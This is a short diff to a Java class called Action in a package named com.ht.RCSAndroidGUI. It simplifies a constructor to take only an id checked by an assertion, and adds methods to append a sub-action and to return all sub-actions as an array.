@@ -8,7 +8,9 @@
 package com.ht.RCSAndroidGUI.action;
 
 import java.util.ArrayList;
+import java.util.Iterator;
 import java.util.List;
+import java.util.ListIterator;
 
 import com.ht.RCSAndroidGUI.RCSException;
 import com.ht.RCSAndroidGUI.util.Check;
@@ -44,10 +46,8 @@ public class Action {
 	 * @throws RCSException
 	 *             the RCS exception
 	 */
-	public Action(final int id, final int num) throws RCSException {
-		if (id < 0 || num < 1) {
-			throw new RCSException("Invalid id or invalid number of sub actions for this action: " + num);
-		}
+	public Action(final int id) {
+		Check.asserts(id>=0, "Invalid id");
 
 		this.actionId = id;
 		list = new ArrayList<SubAction>();
@@ -85,6 +85,14 @@ public class Action {
 		final SubAction sub = SubAction.factory(type, params);
 		list.add(sub);
 	}
+	
+	/**
+	 * Mainly for test purposes
+	 * @param sub
+	 */
+	public void addSubAction(SubAction sub) {
+		list.add(sub);
+	}
 
 	/**
 	 * Gets the sub action.
@@ -101,5 +109,9 @@ public class Action {
 		}
 
 		return list.get(index);
+	}
+
+	public SubAction[] getSubActions() {
+		return list.toArray(new SubAction[]{});
 	}
 }
